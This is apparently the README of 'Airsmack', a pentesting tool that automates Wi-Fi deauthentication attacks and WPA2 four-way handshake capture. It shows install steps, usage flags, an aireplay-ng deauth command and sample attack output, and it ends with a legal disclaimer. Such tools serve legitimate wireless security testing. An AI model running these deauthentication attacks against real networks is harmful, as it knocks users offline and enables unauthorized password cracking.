# **Airsmack**

_Airsmack is a tool designed for wireless network monitoring and attack automation using Airodump-ng and related utilities._

## Overview
Airsmack streamlines *wireless security assessments* by automating data collection, deauthentication attacks, and handshake captures. It integrates *multiprocessing*, *subprocess management*, and *custom scripting* for efficient execution.

**Developed and Tested on:**
```
 Kali Linux (`latest`)
```

**Installation:**
```bash
sudo apt install cowpatty
```
```bash
git clone https://github.com/B34MR/airsmack.git
cd airsmack
pip install -r requirements.txt
```

**Docker Installation:**
```bash
git clone https://github.com/B34MR/airsmack.git
cd airsmack
docker build -t airsmack .
docker run -it --rm --privileged --network=host -v "$(pwd)":/opt/airsmack airsmack 
```

**Usage:**
```python
Usage Examples:
  python airsmack.py -i wlan0 -p5


Interface Arguments:
  -i       Set interface <wlan0>

Aireplay-ng Arguments:
  -p       Set number of deauthentication packets <5>

Global Arguments:
  --debug  Set logging level [DEBUG]
```
Run Airsmack, select target ESSID and capture the Four-way Handshake!
```python
╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                                                    │
│        / \(((_)))___ ___  ___ _    __    ___ __ __                                                                 │
│       / _ \ | | '__/ __| '_ ` _ \ / _` |/ __| |/ /                                                                 │
│      / ___ \| | |  \__ \ | | | | | (_| | (__|   <                                                                  │
│     /_/   \_\_|_|  |___/_| |_| |_|\__,_|\___|_|\_\                                                                 │
│                                                                                                                    │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Target ───────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                                                    │
│  BSSID: BB:BB:BB:BB:BB:BB                                                                                          │
│  Channel: 7                                                                                                        │
│  Encryption: WPA2                                                                                                  │
│  SSID: Contoso                                                                                                     │
│  Client(s): CC:CC:CC:CC:CC:CC                                                                                      │
│                                                                                                                    │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Aireplay-ng ──────────────────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                                                    │
│  aireplay-ng -0 5 -a BB:BB:BB:BB:BB:BB -c CC:CC:CC:CC:CC:CC --ignore-negative-one wlan0                            │
│                                                                                                                    │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
17:00:01  Waiting for beacon frame (BSSID: BB:BB:BB:BB:BB:BB) on channel 7
17:00:02  Sending 64 directed DeAuth (code 7). STMAC: [CC:CC:CC:CC:CC:CC] [ 1|34 ACKs]
17:00:03  Sending 64 directed DeAuth (code 7). STMAC: [CC:CC:CC:CC:CC:CC] [17|64 ACKs]
17:00:04  Sending 64 directed DeAuth (code 7). STMAC: [CC:CC:CC:CC:CC:CC] [ 1|61 ACKs]
17:00:05  Sending 64 directed DeAuth (code 7). STMAC: [CC:CC:CC:CC:CC:CC] [ 6|128 ACKs]
17:00:06  Sending 64 directed DeAuth (code 7). STMAC: [CC:CC:CC:CC:CC:CC] [ 2|121 ACKs]
 [✔] Captured a Four-way Handshake!
 [✔] Four-way Handshake is most likely for: BB:BB:BB:BB:BB:BB, Contoso
 Capture file moved to: results/Contoso_April-20-2025_17:00:07.cap

 Press <ENTER> to exit
```

### Legal Disclaimer
This project is intended for educational and security research purposes only. Unauthorized use of network monitoring tools may violate laws and regulations. The developers assume no responsibility for misuse. Always ensure you have explicit permission before testing on any network.
